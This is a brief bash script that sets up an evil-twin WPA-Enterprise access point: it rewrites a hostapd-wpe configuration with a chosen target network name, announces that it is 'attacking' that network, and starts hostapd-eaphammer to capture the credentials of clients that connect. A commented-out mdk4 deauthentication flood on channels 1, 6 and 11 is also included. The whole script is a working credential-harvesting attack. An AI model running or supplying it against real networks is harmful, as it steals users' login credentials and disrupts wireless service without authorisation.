#!/bin/bash

[[ $# -ge 1 ]] && essid="$1" || read -p 'essid: ' essid

EAP='wlan0'

MON='mon0' #opt

cp /etc/hostapd-wpe/hostapd-wpe.conf /tmp/hostapd-wpe.conf

sed -i "s/interface=.*/interface=$EAP/g" /tmp/hostapd-wpe.conf

sed -i "s/ssid=.*/ssid=$essid/g" /tmp/hostapd-wpe.conf

echo "[+] attacking $essid"

#sudo timeout $attack_time mdk4 $MON d -c 1,6,11 &

sudo hostapd-eaphammer -x /tmp/hostapd-wpe.conf
